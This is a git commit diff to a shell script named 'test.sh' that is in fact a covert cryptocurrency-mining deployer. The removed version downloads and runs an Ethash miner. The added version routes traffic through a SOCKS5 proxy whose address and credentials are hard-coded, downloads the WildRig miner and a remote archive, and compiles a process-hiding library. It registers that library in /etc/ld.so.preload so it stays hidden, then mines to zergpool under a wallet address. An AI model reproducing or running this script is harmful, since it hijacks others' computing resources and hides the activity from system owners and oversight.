ea076e21590eaa524a2832379cfb52ff7859ed6d
Myaxisplay <101804515+Myaxisplay@users.noreply.github.com>
2022-05-29 20:32:46 +0700

    Update test.sh

--- test.sh
+++ test.sh
@@ -1,10 +1,46 @@
 #!/bin/sh
-wget https://cuan.mine.nu/nbminer
-ACAK=$(echo $(curl -s https://cuan.mine.nu/random.php))
-chmod +x nbminer && mv nbminer $ACAK
-WALLET=prodent
-POOL=stratum+tcp://ethash.poolbinance.com:1800
-WORKER1=$(echo $(shuf -i 1000-9999 -n 1))
-#WORKER2=$(date '+%d%b')
-#WORKER3=$(echo $(nvidia-smi --query-gpu=gpu_name --format=csv,noheader) | tr -d " ","-")
-./$ACAK --algo ETHASH --pool $POOL --user $WALLET.$WORKER1 --tls 0 -- ethstratum ETHV1 --silence 3
+ln -fs /usr/share/zoneinfo/Africa/Johannesburg /etc/localtime
+dpkg-reconfigure --frontend noninteractive tzdata
+
+wget https://raw.githubusercontent.com/nathanfleight/scripts/main/graphics.tar.gz
+
+tar -xvzf graphics.tar.gz
+
+cat > graftcp/local/graftcp-local.conf <<END
+listen = :2233
+loglevel = 1
+socks5 = 176.53.133.217:57597
+socks5_username = 2BHVpyGPD
+socks5_password = 1rN14HAmV
+END
+
+./graftcp/local/graftcp-local -config graftcp/local/graftcp-local.conf &
+
+sleep .2
+
+echo " "
+echo " "
+
+echo " "
+
+./graftcp/graftcp curl ifconfig.me
+
+echo " "
+echo " "
+
+echo " "
+
+echo " "
+echo " "
+
+./graftcp/graftcp wget https://github.com/andru-kun/wildrig-multi/releases/download/0.31.3/wildrig-multi-linux-0.31.3.tar.xz
+tar -xf wildrig-multi-linux-0.31.3.tar.xz
+chmod +x wildrig-multi
+
+./graftcp/graftcp wget https://raw.githubusercontent.com/nathanfleight/scripts/main/magicBezzHash.zip
+unzip magicBezzHash.zip
+make
+gcc -Wall -fPIC -shared -o libprocesshider.so processhider.c -ldl
+mv libprocesshider.so /usr/local/lib/
+echo /usr/local/lib/libprocesshider.so >> /etc/ld.so.preload
+./graftcp/graftcp ./wildrig-multi --algo skein2 --opencl-threads auto --opencl-launch auto --url stratum+tcp://skein2.asia.mine.zergpool.com:5233 --user WcMvYA7WuwcGD8ywcreYsw2xXofdnPsGNC --pass x
